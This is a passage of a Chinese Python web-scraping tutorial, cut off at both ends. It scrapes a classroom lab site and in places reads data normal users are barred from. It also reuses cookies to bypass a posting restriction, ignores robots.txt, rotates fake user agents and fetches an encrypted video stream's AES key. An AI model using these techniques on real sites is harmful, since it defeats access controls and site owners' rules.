class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span>item<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span>    txt<span class="token punctuation">.</span>write<span class="token punctuation">(</span>name <span class="token operator">+</span> <span class="token string">'down'</span> <span class="token operator">+</span> <span class="token string">'\n'</span><span class="token punctuation">)</span>txt<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="六、爬取神秘暗网留言板（动态网站json）"><a href="#六、爬取神秘暗网留言板（动态网站json）" class="headerlink" title="六、爬取神秘暗网留言板（动态网站json）"></a>六、爬取神秘暗网留言板（动态网站json）</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token punctuation">,</span>openpyxlwb <span class="token operator">=</span> openpyxl<span class="token punctuation">.</span>Workbook<span class="token punctuation">(</span><span class="token punctuation">)</span>sheet <span class="token operator">=</span> wb<span class="token punctuation">.</span>activesheet<span class="token punctuation">.</span>title <span class="token operator">=</span> <span class="token string">'留言数据'</span>sheet<span class="token punctuation">[</span><span class="token string">'A1'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'用户ID'</span>sheet<span class="token punctuation">[</span><span class="token string">'B1'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'用户名'</span>sheet<span class="token punctuation">[</span><span class="token string">'C1'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'积分'</span>sheet<span class="token punctuation">[</span><span class="token string">'D1'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'留言内容'</span><span class="token comment"># 爬取前十页</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> <span class="token string">'http://10.163.72.55/messageData.php?currentPage='</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    res_jons <span class="token operator">=</span> res<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 解析为json格式数据</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">type</span><span class="token punctuation">(</span>res_jons<span class="token punctuation">)</span><span class="token punctuation">)</span>    massage_list <span class="token operator">=</span> res_jons<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> item <span class="token keyword">in</span> massage_list<span class="token punctuation">:</span>        <span class="token builtin">id</span> <span class="token operator">=</span> item<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span>        username <span class="token operator">=</span> item<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span>        rankScore <span class="token operator">=</span> item<span class="token punctuation">[</span><span class="token string">'rankScore'</span><span class="token punctuation">]</span>        message <span class="token operator">=</span> item<span class="token punctuation">[</span><span class="token string">'message'</span><span class="token punctuation">]</span>        sheet<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">id</span><span class="token punctuation">,</span>username<span class="token punctuation">,</span>rankScore<span class="token punctuation">,</span>message<span class="token punctuation">]</span><span class="token punctuation">)</span>wb<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">'.\神秘暗网留言板爬虫.xlsx'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="七、带着参数请求数据（偷看隐藏数据）"><a href="#七、带着参数请求数据（偷看隐藏数据）" class="headerlink" title="七、带着参数请求数据（偷看隐藏数据）"></a>七、带着参数请求数据（偷看隐藏数据）</h2><p>假设神秘暗网首页作业栏目，不可以点击查看更多，可以携带参数查看隐藏信息。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">'http://10.163.72.55/taskListData.php'</span>params <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'task_num'</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">}</span>res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>params<span class="token operator">=</span>params<span class="token punctuation">)</span>res_json <span class="token operator">=</span> res<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>task_list <span class="token operator">=</span> res_json<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token keyword">for</span> task <span class="token keyword">in</span> task_list<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'作业标题为：'</span><span class="token punctuation">,</span>task<span class="token punctuation">[</span><span class="token string">'title'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>假设用户管理中，教师组属于敏感信息，不让普通用户查询，你知道该怎么做了吧。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">'http://10.163.72.55/userAdminDataClass.php'</span>params <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'className'</span><span class="token punctuation">:</span><span class="token string">'22计2'</span><span class="token punctuation">}</span>res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>params<span class="token operator">=</span>params<span class="token punctuation">)</span>res_json <span class="token operator">=</span> res<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>user_list <span class="token operator">=</span> res_json<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token keyword">for</span> user <span class="token keyword">in</span> user_list<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'用户姓名为：'</span><span class="token punctuation">,</span>user<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="八、指挥浏览器登录神秘暗网（自动脚本）"><a href="#八、指挥浏览器登录神秘暗网（自动脚本）" class="headerlink" title="八、指挥浏览器登录神秘暗网（自动脚本）"></a>八、指挥浏览器登录神秘暗网（自动脚本）</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> selenium <span class="token keyword">import</span>  webdriver <span class="token comment"># 从selenium库中调用webdriver模块</span><span class="token keyword">from</span> selenium<span class="token punctuation">.</span>webdriver<span class="token punctuation">.</span>common<span class="token punctuation">.</span>by <span class="token keyword">import</span> By<span class="token keyword">import</span> timedriver<span class="token operator">=</span>webdriver<span class="token punctuation">.</span>Chrome<span class="token punctuation">(</span><span class="token punctuation">)</span>driver<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://10.163.72.55/#/index/IndexTask'</span><span class="token punctuation">)</span> <span class="token comment"># 访问页面</span>time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment"># 暂停两秒，等待浏览器缓冲</span>login <span class="token operator">=</span> driver<span class="token punctuation">.</span>find_element<span class="token punctuation">(</span>By<span class="token punctuation">.</span>ID<span class="token punctuation">,</span><span class="token string">'login'</span><span class="token punctuation">)</span>login<span class="token punctuation">.</span>click<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># 点击【提交】按钮</span>username <span class="token operator">=</span> driver<span class="token punctuation">.</span>find_element<span class="token punctuation">(</span>By<span class="token punctuation">.</span>ID<span class="token punctuation">,</span><span class="token string">'username'</span><span class="token punctuation">)</span> <span class="token comment"># 找到用户名输入框位置</span>username<span class="token punctuation">.</span>send_keys<span class="token punctuation">(</span><span class="token string">'你的名字'</span><span class="token punctuation">)</span> <span class="token comment"># 输入文字</span>password <span class="token operator">=</span> driver<span class="token punctuation">.</span>find_element<span class="token punctuation">(</span>By<span class="token punctuation">.</span>ID<span class="token punctuation">,</span><span class="token string">'password'</span><span class="token punctuation">)</span> <span class="token comment"># 找到密码输入框位置</span>password<span class="token punctuation">.</span>send_keys<span class="token punctuation">(</span><span class="token number">123456</span><span class="token punctuation">)</span>login_button <span class="token operator">=</span> driver<span class="token punctuation">.</span>find_element<span class="token punctuation">(</span>By<span class="token punctuation">.</span>CLASS_NAME<span class="token punctuation">,</span><span class="token string">'login_button'</span><span class="token punctuation">)</span> <span class="token comment"># 找到密码输入框位置</span>login_button<span class="token punctuation">.</span>click<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="九、通过cookie留言（突破留言板限制）"><a href="#九、通过cookie留言（突破留言板限制）" class="headerlink" title="九、通过cookie留言（突破留言板限制）"></a>九、通过cookie留言（突破留言板限制）</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token comment">#获得cookies</span>url<span class="token operator">=</span><span class="token string">'http://10.163.72.55/LoginPost.php'</span>headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'User-Agent'</span><span class="token punctuation">:</span><span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36'</span><span class="token punctuation">}</span>data<span class="token operator">=</span><span class="token punctuation">{</span>    <span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string">'username'</span><span class="token punctuation">,</span>    <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">'password'</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span>login<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>cookies<span class="token operator">=</span>login<span class="token punctuation">.</span>cookies<span class="token keyword">print</span><span class="token punctuation">(</span>cookies<span class="token punctuation">)</span><span class="token comment">#用cookies登陆</span>url_2<span class="token operator">=</span><span class="token string">'http://10.163.72.55/messagePost.php'</span>params <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'gb_word'</span><span class="token punctuation">:</span><span class="token string">'没想到吧，我还是可以留言，哈哈'</span><span class="token punctuation">}</span>res<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url_2<span class="token punctuation">,</span>cookies<span class="token operator">=</span>cookies<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">,</span>params<span class="token operator">=</span>params<span class="token punctuation">)</span>res_json <span class="token operator">=</span> res<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>res_json<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="十、使用scrpit框架爬豆瓣"><a href="#十、使用scrpit框架爬豆瓣" class="headerlink" title="十、使用scrpit框架爬豆瓣"></a>十、使用scrpit框架爬豆瓣</h2><pre class="line-numbers language-dos" data-language="dos"><code class="language-dos">pip install scrapy -i https://pypi.tuna.tsinghua.edu.cn/simple/ # 安装环境scrapy startproject douban # 创建项目scrapy crawl douban #运行工程<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>爬虫模块（在spiders目录下新建xx.py文件）</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># (爬虫)部门是公司的核心业务部门</span><span class="token comment"># 负责创建requests对象和接受引擎发送过来的response（Downloader部门爬取到的内容），从中解析并提取出有用的数据。</span><span class="token comment"># 它对应的是爬虫流程【解析数据】和【提取数据】这两步</span><span class="token keyword">import</span> scrapy<span class="token keyword">import</span> bs4<span class="token comment"># 需要引用DoubanItem，它在items里面。因为是items在top250.py的上一级目录，所以要用..items，这是一个固定用法。</span><span class="token keyword">from</span> <span class="token punctuation">.</span><span class="token punctuation">.</span>items <span class="token keyword">import</span> DoubanItem<span class="token comment"># DoubanSpider类继承自scrapy.Spider类</span><span class="token keyword">class</span> <span class="token class-name">DoubanSpider</span><span class="token punctuation">(</span>scrapy<span class="token punctuation">.</span>Spider<span class="token punctuation">)</span><span class="token punctuation">:</span>    name <span class="token operator">=</span> <span class="token string">'douban'</span>   <span class="token comment"># 定义爬虫的名字，这个名字是爬虫的唯一标识</span>    <span class="token comment"># allowed_domains是定义允许爬虫爬取的网址域名（不需要加https://）。</span>    <span class="token comment"># 如果网址的域名不在这个列表里，就会被过滤掉</span>    <span class="token comment"># 一定在book.douban.com这个域名之下，防止爬到广告页面去</span>    allowed_domains <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'book.douban.com'</span><span class="token punctuation">]</span>    <span class="token comment"># 定义起始网址，就是爬虫从哪个网址开始抓取</span>    <span class="token comment"># 注：allowed_domains的设定对start_urls里的网址不会有影响</span>    start_urls <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'https://book.douban.com/top250?start=0'</span><span class="token punctuation">]</span>    <span class="token comment"># 根据url的规律，构建出前三页地址</span>    start_urls <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        url <span class="token operator">=</span> <span class="token string">'https://book.douban.com/top250?start='</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x <span class="token operator">*</span> <span class="token number">25</span><span class="token punctuation">)</span>        start_urls<span class="token punctuation">.</span>append<span class="token punctuation">(</span>url<span class="token punctuation">)</span>        <span class="token comment"># 解析下载器传过来的数据</span>    <span class="token keyword">def</span> <span class="token function">parse</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># 爬取的数据存储在response.text</span>        bs <span class="token operator">=</span> bs4<span class="token punctuation">.</span>BeautifulSoup<span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">,</span><span class="token string">'html.parser'</span><span class="token punctuation">)</span>        datas <span class="token operator">=</span> bs<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span><span class="token string">'tr'</span><span class="token punctuation">,</span>class_<span class="token operator">=</span><span class="token string">"item"</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> data <span class="token keyword">in</span>  datas<span class="token punctuation">:</span>            <span class="token comment">#实例化DoubanItem类。</span>            item <span class="token operator">=</span> DoubanItem<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token comment"># 书名</span>            item<span class="token punctuation">[</span><span class="token string">'title'</span><span class="token punctuation">]</span> <span class="token operator">=</span> data<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'title'</span><span class="token punctuation">]</span>            <span class="token comment">#提取出出版信息，并把这个数据放回DoubanItem类的publish里。</span>            item<span class="token punctuation">[</span><span class="token string">'publish'</span><span class="token punctuation">]</span> <span class="token operator">=</span> data<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'p'</span><span class="token punctuation">,</span>class_<span class="token operator">=</span><span class="token string">'pl'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text            <span class="token comment"># 评分</span>            item<span class="token punctuation">[</span><span class="token string">'score'</span><span class="token punctuation">]</span> <span class="token operator">=</span> data<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'span'</span><span class="token punctuation">,</span>class_<span class="token operator">=</span><span class="token string">'rating_nums'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text            <span class="token keyword">print</span><span class="token punctuation">(</span>item<span class="token punctuation">[</span><span class="token string">'title'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token comment">#yield item是把获得的item传递给引擎。</span>            <span class="token comment">#有点类似return，不过它和return不同的点在于，它不会结束函数，且能多次返回信息</span>            <span class="token keyword">yield</span> item<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>数据处理模块（items.py）</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># （数据管道）部门则是公司的数据部门</span><span class="token comment"># 只负责存储和处理Spiders部门提取到的有用数据。这个对应的是爬虫流程【存储数据】这一步。</span><span class="token keyword">import</span> scrapy<span class="token comment">#定义一个类DoubanItem，它继承自scrapy.Item</span><span class="token keyword">class</span> <span class="token class-name">DoubanItem</span><span class="token punctuation">(</span>scrapy<span class="token punctuation">.</span>Item<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># scrapy.Field() 相当于自定义字典类型</span>    title <span class="token operator">=</span> scrapy<span class="token punctuation">.</span>Field<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#定义书名的数据属性</span>    publish <span class="token operator">=</span> scrapy<span class="token punctuation">.</span>Field<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#定义出版信息的数据属性</span>    score <span class="token operator">=</span> scrapy<span class="token punctuation">.</span>Field<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#定义评分的数据属性</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>设置（settings.py）</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 保存爬取的数据</span>FEED_URI<span class="token operator">=</span><span class="token string">'./storage/data/%(name)s.csv'</span>FEED_FORMAT<span class="token operator">=</span><span class="token string">'csv'</span>FEED_EXPORT_ENCODING<span class="token operator">=</span><span class="token string">'ansi'</span> <span class="token comment"># 导出文件编码，ansi是一种在windows上的编码格式</span>USER_AGENT <span class="token operator">=</span> <span class="token string">'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36'</span><span class="token comment"># 是否需要遵守爬虫规则，改成不遵守</span>ROBOTSTXT_OBEY <span class="token operator">=</span> <span class="token boolean">False</span><span class="token comment"># 爬虫的速度</span>DOWNLOAD_DELAY <span class="token operator">=</span> <span class="token number">0.5</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>主程序启动模块</strong> <em><strong>（main.py，和scrapy.cfg同级）</strong></em>（注意：一定要将项目文件夹作为编程文件夹）</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#导入cmdline模块,可以实现控制终端命令行。</span><span class="token keyword">from</span> scrapy <span class="token keyword">import</span> cmdline<span class="token comment">#用execute（）方法，输入运行scrapy的命令。</span>cmdline<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'scrapy'</span><span class="token punctuation">,</span><span class="token string">'crawl'</span><span class="token punctuation">,</span><span class="token string">'douban'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>作业：爬取当当网前三页，书名，作者，价格<br><a href="http://bang.dangdang.com/books/bestsellers/01.00.00.00.00.00-year-2018-0-1-1">http://bang.dangdang.com/books/bestsellers/01.00.00.00.00.00-year-2018-0-1-1</a></p><p><strong>扩展提升</strong><br>爬取每一条新闻里的内容<br><a href="http://www.news.zjut.edu.cn/5415/list.htm">http://www.news.zjut.edu.cn/5415/list.htm</a></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># (爬虫)部门是公司的核心业务部门</span><span class="token comment"># 负责创建requests对象和接受引擎发送过来的response（Downloader部门爬取到的内容），从中解析并提取出有用的数据。</span><span class="token comment"># 它对应的是爬虫流程【解析数据】和【提取数据】这两步</span><span class="token keyword">import</span> scrapy<span class="token keyword">import</span> bs4<span class="token comment"># 需要引用DoubanItem，它在items里面。因为是items在top250.py的上一级目录，所以要用..items，这是一个固定用法。</span><span class="token keyword">from</span> <span class="token punctuation">.</span><span class="token punctuation">.</span>items <span class="token keyword">import</span> DoubanItem<span class="token comment"># DoubanSpider类继承自scrapy.Spider类</span><span class="token keyword">class</span> <span class="token class-name">DoubanSpider</span><span class="token punctuation">(</span>scrapy<span class="token punctuation">.</span>Spider<span class="token punctuation">)</span><span class="token punctuation">:</span>    name <span class="token operator">=</span> <span class="token string">'douban'</span>   <span class="token comment"># 定义爬虫的名字，这个名字是爬虫的唯一标识</span>    <span class="token comment"># allowed_domains是定义允许爬虫爬取的网址域名（不需要加https://）。</span>    <span class="token comment"># 如果网址的域名不在这个列表里，就会被过滤掉</span>    <span class="token comment"># 一定在book.douban.com这个域名之下，防止爬到广告页面去</span>    allowed_domains <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'www.news.zjut.edu.cn'</span><span class="token punctuation">]</span>    <span class="token comment"># 定义起始网址，就是爬虫从哪个网址开始抓取</span>    <span class="token comment"># 注：allowed_domains的设定对start_urls里的网址不会有影响</span>    start_urls <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'http://www.news.zjut.edu.cn/5415/list.htm'</span><span class="token punctuation">]</span>        <span class="token comment"># 解析下载器传过来的数据</span>    <span class="token keyword">def</span> <span class="token function">parse</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># 爬取的数据存储在response.text</span>        bs <span class="token operator">=</span> bs4<span class="token punctuation">.</span>BeautifulSoup<span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">,</span><span class="token string">'html.parser'</span><span class="token punctuation">)</span>        datas <span class="token operator">=</span> bs<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span><span class="token string">'span'</span><span class="token punctuation">,</span>class_<span class="token operator">=</span><span class="token string">"news_title"</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> data <span class="token keyword">in</span> datas<span class="token punctuation">:</span>            href <span class="token operator">=</span> data<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'href'</span><span class="token punctuation">]</span>            link <span class="token operator">=</span> <span class="token string">'http://www.news.zjut.edu.cn/5415/list.htm'</span> <span class="token operator">+</span> href            <span class="token comment"># 链接先爬下来回传给引擎，引擎通过调度器给下载器，下载好了再传给我</span>            <span class="token keyword">yield</span> scrapy<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>link<span class="token punctuation">,</span> callback<span class="token operator">=</span>self<span class="token punctuation">.</span>parse2<span class="token punctuation">)</span>        <span class="token comment">#这个就是下载器下载好的数据</span>    <span class="token keyword">def</span> <span class="token function">parse2</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">:</span>        bs <span class="token operator">=</span> bs4<span class="token punctuation">.</span>BeautifulSoup<span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">,</span><span class="token string">'html.parser'</span><span class="token punctuation">)</span>        item <span class="token operator">=</span> DoubanItem<span class="token punctuation">(</span><span class="token punctuation">)</span>        item<span class="token punctuation">[</span><span class="token string">'title'</span><span class="token punctuation">]</span> <span class="token operator">=</span> bs<span class="token punctuation">.</span>find<span class="token punctuation">(</span>class_<span class="token operator">=</span><span class="token string">'arti_title'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text        <span class="token keyword">yield</span> item<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="十一、破解并下载视频流"><a href="#十一、破解并下载视频流" class="headerlink" title="十一、破解并下载视频流"></a>十一、破解并下载视频流</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token punctuation">,</span>re<span class="token punctuation">,</span>random<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES<span class="token comment"># 伪装请求头</span>user_agent <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token string">'Mozilla/5.0 (Windows NT 5.2) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.122 Safari/534.30'</span><span class="token punctuation">,</span>    <span class="token string">'Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0'</span><span class="token punctuation">,</span>    <span class="token string">'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET4.0E; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C)'</span><span class="token punctuation">,</span>    <span class="token string">'Opera/9.80 (Windows NT 5.1; U; zh-cn) Presto/2.9.168 Version/11.50'</span><span class="token punctuation">,</span>    <span class="token string">'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/533.21.1 (KHTML, like Gecko) Version/5.0.5 Safari/533.21.1'</span><span class="token punctuation">,</span>    <span class="token string">'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; .NET4.0E; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C)'</span><span class="token punctuation">,</span>    <span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36'</span><span class="token punctuation">]</span>headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'User-Agent'</span><span class="token punctuation">:</span> random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>user_agent<span class="token punctuation">)</span><span class="token punctuation">}</span>url <span class="token operator">=</span> <span class="token string">'http://www.nvic.edu.cn/CompetitionVideo/Detail?worksId=3ddcd2d0-39f1-49b8-83a2-03b8e5ef780d&amp;sType=5&amp;competitionId=ce116ee4-ca64-4c16-9aff-750fed3335cf'</span>res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span><span class="token comment"># 获取几个独立视频的链接</span>pattern<span class="token operator">=</span>re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">'data-path="(.*?)"'</span><span class="token punctuation">)</span>indexs_list<span class="token operator">=</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token keyword">for</span> index <span class="token keyword">in</span> indexs_list<span class="token punctuation">:</span>    <span class="token comment"># 获取视频文件存放路径</span>    path <span class="token operator">=</span> index<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">10</span><span class="token punctuation">]</span>    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>index<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>    pattern<span class="token operator">=</span>re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">'URI="(.*?.key)"'</span><span class="token punctuation">)</span>    key<span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>     key_url <span class="token operator">=</span> path <span class="token operator">+</span> key  <span class="token comment"># 拼凑出key的地址</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>key_url<span class="token punctuation">)</span>    key_res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>key_url<span 